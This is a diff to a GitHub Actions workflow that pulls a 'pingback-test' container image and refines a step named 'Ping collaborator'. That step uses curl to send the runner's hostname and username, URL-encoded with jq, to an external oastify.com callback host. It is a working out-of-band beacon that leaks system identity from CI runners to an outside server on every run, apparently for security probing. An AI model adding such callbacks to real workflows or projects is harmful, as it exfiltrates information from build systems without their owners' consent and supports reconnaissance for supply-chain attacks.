@@ -8,6 +8,9 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
+      - name: Install jq for URL encoding
+        run: sudo apt-get update && sudo apt-get install -y jq
+
       - name: Log in to GitHub Container Registry
         run: |
           echo "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
@@ -16,9 +19,11 @@ jobs:
         run: |
           docker pull ghcr.io/${{ github.repository_owner }}/pingback-test:latest
 
-      - name: Ping collaborator with hostname and user
+      - name: Ping collaborator with hostname and user (URL-encoded)
         run: |
-          curl -s "http://pyr473mv5r7jghw2amsfw8xtikobc2gq5.oastify.com/ping?host=$(hostname)&user=$(whoami)" > /dev/null
+          host_enc=$(hostname | jq -sRr @uri)
+          user_enc=$(whoami | jq -sRr @uri)
+          curl -s "http://pyr473mv5r7jghw2amsfw8xtikobc2gq5.oastify.com/ping?host=${host_enc}&user=${user_enc}" > /dev/null
 
       - name: Show image labels (optional)
         run: |
